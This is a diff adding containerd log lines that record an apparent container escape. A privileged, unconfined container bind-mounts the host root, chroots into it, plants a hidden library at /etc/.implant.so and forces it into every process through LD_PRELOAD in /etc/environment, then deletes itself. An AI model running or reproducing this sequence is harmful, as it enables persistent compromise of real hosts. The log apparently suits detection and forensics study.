@@ -1,0 +1,9 @@
+2026-04-21T03:14:07.128Z INF k8s.io/containerd/v2/plugin "Event" topic=/tasks/create namespace=k8s.io container-id=abc7d2f91a3e image=docker.io/library/alpine@sha256:74b... privileged=true caps_add=[CAP_SYS_ADMIN,CAP_SYS_MODULE,CAP_NET_ADMIN] apparmor=unconfined seccomp=unconfined
+2026-04-21T03:14:07.242Z INF k8s.io/containerd/v2/plugin "Event" topic=/tasks/start namespace=k8s.io container-id=abc7d2f91a3e pid=48219
+2026-04-21T03:14:07.998Z WRN k8s.io/containerd/v2/plugin "Mount" namespace=k8s.io container-id=abc7d2f91a3e source=/ target=/host rw=true type=bind
+2026-04-21T03:14:15.401Z INF k8s.io/containerd/v2/plugin "Exec" namespace=k8s.io container-id=abc7d2f91a3e cmd="chroot /host /bin/bash -c 'echo LD_PRELOAD=/etc/.implant.so >> /etc/environment'"
+2026-04-21T03:14:16.112Z INF k8s.io/containerd/v2/plugin "Exec" namespace=k8s.io container-id=abc7d2f91a3e cmd="chroot /host /bin/cp /tmp/.implant.so /etc/.implant.so"
+2026-04-21T03:14:17.024Z INF k8s.io/containerd/v2/plugin "Exec" namespace=k8s.io container-id=abc7d2f91a3e cmd="chroot /host /bin/chmod 0755 /etc/.implant.so"
+2026-04-21T03:14:22.501Z INF k8s.io/containerd/v2/plugin "Event" topic=/tasks/exit namespace=k8s.io container-id=abc7d2f91a3e exit-code=0
+2026-04-21T03:14:22.872Z INF k8s.io/containerd/v2/plugin "Event" topic=/tasks/delete namespace=k8s.io container-id=abc7d2f91a3e
+2026-04-21T03:14:23.012Z INF k8s.io/containerd/v2/plugin "Event" topic=/containers/delete namespace=k8s.io container-id=abc7d2f91a3e
